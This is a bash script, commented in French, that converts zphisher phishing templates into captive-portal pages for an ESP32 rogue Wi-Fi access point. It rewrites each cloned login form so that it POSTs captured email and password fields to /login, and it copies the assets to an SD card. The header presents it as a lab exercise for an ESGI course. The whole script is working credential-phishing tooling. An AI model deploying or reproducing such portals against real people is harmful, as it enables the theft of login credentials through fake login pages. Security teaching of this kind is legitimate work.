#!/usr/bin/env bash
# zphisher_to_sd.sh — convertit des templates zphisher en portails Axolotl (SD).
#
# Pensé pour le fork Evil_Rogue_AP (https://github.com/matxsu/Evil_Rogue_AP),
# structure zphisher standard : .sites/<Site>/{login.html,login.php,assets...}.
#
# Cadre : projet pédagogique ESGI, labo, matériel de l'équipe. L'ESP32 ne fait
# PAS tourner de PHP : il sert le HTML + les assets et capture le POST /login.
#
# Usage :
#   ./zphisher_to_sd.sh <dir_.sites_zphisher> <dir_sortie>
# Exemple :
#   ./zphisher_to_sd.sh ~/Evil_Rogue_AP/zphisher/.sites  /run/media/$USER/AXOLOTL/portals
#
# Chaque site <Site> devient <sortie>/<site>/ avec :
#   - index.html  (issu de login.html/index.html, <form> → action="/login" POST,
#                  champs renommés en name="email" / name="password")
#   - tous les assets (images, css, js, sous-dossiers) copiés tels quels
#   - les .php supprimés (inutiles sur l'ESP32)
set -euo pipefail

SRC="${1:-}"
OUT="${2:-}"
if [[ -z "$SRC" || -z "$OUT" ]]; then
  echo "usage: $0 <dir_.sites_zphisher> <dir_sortie>" >&2
  exit 1
fi
[[ -d "$SRC" ]] || { echo "erreur: sources introuvables: $SRC" >&2; exit 1; }

mkdir -p "$OUT"
count=0

for site_dir in "$SRC"/*/; do
  [[ -d "$site_dir" ]] || continue
  name="$(basename "$site_dir")"
  slug="$(echo "$name" | tr '[:upper:] ' '[:lower:]-' | tr -cd 'a-z0-9-_')"

  # Page principale : index.html sinon login.html sinon 1er .html.
  html=""
  for cand in index.html login.html; do
    [[ -f "$site_dir/$cand" ]] && { html="$site_dir/$cand"; break; }
  done
  [[ -z "$html" ]] && html="$(find "$site_dir" -maxdepth 1 -iname '*.html' | head -n1 || true)"
  [[ -z "$html" ]] && { echo "  skip $name (aucun .html)" >&2; continue; }

  dst="$OUT/$slug"
  rm -rf "$dst"; mkdir -p "$dst"

  # Copie récursive de tout le site (assets + sous-dossiers), puis on purge le PHP.
  cp -r "$site_dir"/. "$dst"/ 2>/dev/null || true
  find "$dst" -type f -iname '*.php' -delete 2>/dev/null || true
  # On retire les .html sources (on régénère index.html juste après).
  find "$dst" -maxdepth 1 -type f -iname '*.html' -delete 2>/dev/null || true

  # Génère index.html : form → /login POST, champs → email/password.
  sed -E \
    -e 's#(<form[^>]*\baction=)"[^"]*"#\1"/login"#Ig' \
    -e 's#(<form[^>]*\bmethod=)"[^"]*"#\1"POST"#Ig' \
    -e 's#(name=)"(username|user|login|identifiant|email_or_phone|phone)"#\1"email"#Ig' \
    -e 's#(name=)"(pass|passwd|pwd|motdepasse)"#\1"password"#Ig' \
    "$html" > "$dst/index.html"

  echo "  ok  $name -> $dst/ ($(find "$dst" -type f | wc -l) fichiers)"
  count=$((count+1))
done

echo "Termine : $count portail(s) dans $OUT"
echo "Le firmware sert index.html + les assets depuis /sdcard/portals/<site>/."
